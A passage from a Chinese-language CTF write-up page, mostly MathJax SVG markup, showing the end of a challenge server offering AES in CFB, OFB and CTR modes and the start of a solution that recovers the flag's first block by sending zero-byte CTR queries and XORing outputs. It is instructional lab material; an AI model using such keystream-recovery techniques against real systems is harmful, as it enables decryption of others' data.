class="string">"What operation mode do you want for encryption? "</span>)</span><br><span class="line">            pt = b64decode(<span class="built_in">input</span>(<span class="string">"What message do you want to encrypt (in base64)? "</span>))</span><br><span class="line">            pt = pt.ljust( ((<span class="built_in">len</span>(pt) - <span class="number">1</span>) // <span class="number">16</span> + <span class="number">1</span>) * <span class="number">16</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">            <span class="keyword">if</span> mode == <span class="string">"CFB"</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_CFB(counter, pt)) )</span><br><span class="line">            <span class="keyword">elif</span> mode == <span class="string">"OFB"</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_OFB(counter, pt)) )</span><br><span class="line">            <span class="keyword">elif</span> mode == <span class="string">"CTR"</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_CTR(counter, pt)) )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"Sorry, I don't understand."</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"??"</span>)</span><br><span class="line">            exit()</span><br><span class="line">    </span><br></pre></td></tr></table></figure></div><h4 id="題解"><a href="#題解" class="headerlink" title="題解"></a>題解</h4><p><a class="link" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_(CFB)">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_feedback_(CFB) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h5 id="Step1-取得-flag-16"><a href="#Step1-取得-flag-16" class="headerlink" title="Step1: 取得 flag[:16]"></a>Step1: 取得 <code>flag[:16]</code></h5><h6 id="1-1-取得-c1-16"><a href="#1-1-取得-c1-16" class="headerlink" title="1.1 取得 c1[:16]"></a>1.1 取得 <code>c1[:16]</code></h6><p>取得這個值需要先取得 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="11.612ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5132.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(1372,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1857,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2429,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3029,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(3390,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(3856,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(4743.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>, 其中 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.244ex" height="2.059ex" role="img" focusable="false" viewBox="0 -705 550 910"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g></g></g></svg></mjx-container> 表示題目的 <code>AES_enc</code>, 取得之後 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="21.307ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 9417.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(1372,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1857,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2429,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3029,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(3390,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(3856,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(4743.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5354.8,0)"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"></path></g><g data-mml-node="mi" transform="translate(6355,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(6806,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(7306,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mo" transform="translate(7584,0)"><path data-c="3A" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z"></path></g><g data-mml-node="mn" transform="translate(8139.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(9139.8,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container> 就會是 <code>c1[:16]</code> (<code>r1</code> 表示題目加密後的 <code>c1</code>, <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.188ex;" xmlns="http://www.w3.org/2000/svg" width="1.76ex" height="1.507ex" role="img" focusable="false" viewBox="0 -583 778 666"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2295" d="M56 250Q56 394 156 488T384 583Q530 583 626 485T722 250Q722 110 625 14T390 -83Q249 -83 153 14T56 250ZM364 542Q308 539 251 509T148 418T96 278V270H369V542H364ZM681 278Q675 338 650 386T592 462T522 509T458 535T412 542H409V270H681V278ZM96 222Q104 150 139 95T219 12T302 -29T366 -42H369V230H96V222ZM681 222V230H409V-42H412Q429 -42 456 -36T521 -10T590 37T649 113T681 222Z"></path></g></g></g></svg></mjx-container> 表示 xor).</p><p>首先第一個 query 我們先送出 CTR mode 的 query, 內容為 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="6.159ex" height="1.557ex" role="img" focusable="false" viewBox="0 -666 2722.4 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mn" transform="translate(2222.4,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></svg></mjx-container> bytes 的空白訊息 (全 0), server 的回傳值就會是 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="40.883ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 18070.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(1372,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1857,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2429,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3029,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(3390,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="msub" transform="translate(3856,0)"><g data-mml-node="mi"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(484,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(4743.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" 